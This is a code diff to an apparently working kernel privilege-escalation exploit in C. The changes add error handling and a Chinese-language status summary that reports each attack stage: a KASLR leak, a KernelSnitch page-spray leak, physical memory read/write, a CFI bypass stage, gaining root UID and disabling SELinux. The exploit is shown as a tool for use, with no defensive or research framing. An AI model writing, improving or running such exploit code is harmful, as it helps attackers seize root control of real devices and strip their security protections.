@@ -181,12 +181,16 @@ int run_exploit(int argc, char **argv) {
 
   pin_to_core(CORE);
   if (!slide_leak_kernel_base()) {
-    pr_error("slide kaslr leak failed\n");
-    return 1;
+    pr_warning("slide kaslr leak failed\n");
+    goto exploit_summary;
   }
 
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+  if (!page_base) {
+    pr_warning("prepare_good_kernel_page failed (KernelSnitch or page spray)\n");
+    goto exploit_summary;
+  }
 
   run_main_route_threads();
 
@@ -201,10 +205,49 @@ int run_exploit(int argc, char **argv) {
              root_uid_before, root_uid_after, cred_sid_before, real_cred_sid_before,
              cred_sid_after, real_cred_sid_after, selinux_before, selinux_after,
              setgid_ret, setuid_ret, setenforce_ret, setenforce_errno);
+exploit_summary:
   if (pipe_prepare_child > 0) {
     SYSCHK(kill(pipe_prepare_child, SIGKILL));
     SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
   }
+
+  /* 中文总结输出（放到底部，方便截图判断成功/失败） */
+  int exploit_success = root_child_done && (selinux_after == 0);
+  printf("\n");
+  printf("========================================\n");
+  if (exploit_success) {
+    printf("  ★★★ 提权成功！★★★\n");
+  } else {
+    printf("  ✗✗✗ 提权失败 ✗✗✗\n");
+  }
+  printf("----------------------------------------\n");
+  printf("  KASLR 泄露:     %s\n", kaslr_done ? "OK" : "FAIL");
+  printf("  页喷射+KS泄露:  %s\n", page_base ? "OK" : "FAIL");
+  printf("  物理读写:       %s\n",
+         (physrw_read_ok && physrw_write_ok) ? "OK" : "FAIL");
+  printf("  CFI 阶段:       %s\n",
+         atomic_load(&cfi_stage_done) ? "OK" : "FAIL");
+  printf("  Root 提权:      %s\n", root_child_done ? "OK" : "FAIL");
+  printf("  SELinux:        %u -> %u %s\n", selinux_before, selinux_after,
+         selinux_after == 0 ? "(已关闭)" : "(仍开启)");
+  printf("  UID:            %u -> %u\n", root_uid_before, root_uid_after);
+  printf("========================================\n");
+  if (!exploit_success) {
+    if (!kaslr_done)
+      printf("  >> 失败原因: KASLR 泄露失败\n");
+    else if (!page_base)
+      printf("  >> 失败原因: KernelSnitch mm_struct 泄露失败\n");
+    else if (!physrw_read_ok || !physrw_write_ok)
+      printf("  >> 失败原因: 物理读写建立失败\n");
+    else if (!atomic_load(&cfi_stage_done))
+      printf("  >> 失败原因: CFI fops 阶段失败\n");
+    else if (!root_child_done)
+      printf("  >> 失败原因: root 子进程执行失败\n");
+    else if (selinux_after != 0)
+      printf("  >> 失败原因: SELinux 未关闭\n");
+  }
+  printf("\n");
+
   sleep(5);
   return 0;
 }
